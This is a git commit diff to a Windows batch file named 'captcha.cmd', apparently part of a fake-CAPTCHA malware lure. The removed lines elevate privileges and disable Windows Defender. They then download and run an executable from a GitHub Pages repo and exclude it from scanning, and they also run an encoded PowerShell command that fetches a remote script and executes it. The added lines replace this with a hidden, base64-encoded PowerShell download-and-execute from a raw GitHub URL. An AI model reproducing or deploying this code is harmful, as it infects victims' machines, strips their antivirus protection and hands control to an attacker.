7092e86cda134a76316cce66b56cc3d9301c7624
bensgaming-dot <huonglee891@gmail.com>
2025-01-03 18:17:57 +0700

    Update captcha.cmd

--- code/captcha.cmd
+++ code/captcha.cmd
@@ -1,13 +1,2 @@
-@echo off
-cd /d "%~dp0"
-net session >nul 2>&1
-if NOT %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -WindowStyle Hidden -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-start powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGoAdQBzAHQAaQB0AC4AYwBvAG0ALwByAGEAdwAvAG0AcwBkAGMAZwB5ADMAYgB4AGcAIAB8ACAAaQBlAHgA
-:: Tắt Windows Defender (chỉ hoạt động trên một số phiên bản Windows)
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-@echo off
-set "url=https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/captcha.exe"
-set "path=%appdata%\captcha.exe"
-powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%path%'"
-if exist "%path%" start "" "%path%"
-powershell -Command "Add-MpPreference -ExclusionPath '%path%'"
+echo off
+powershell -executionpolicy bypass -WindowStyle hidden -e aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGIAZQBuAHMAZwBhAG0AaQBuAGcALQBkAG8AdAAvAGIAZQBuAHMAZwBhAG0AaQBuAGcALQBkAG8AdAAuAGcAaQB0AGgAdQBiAC4AaQBvAC8AcgBlAGYAcwAvAGgAZQBhAGQAcwAvAG0AYQBpAG4ALwBjAG8AZABlAC8AZABvAHcAbgBsAG8AYQBkACAAfAAgAGkAZQB4AA==
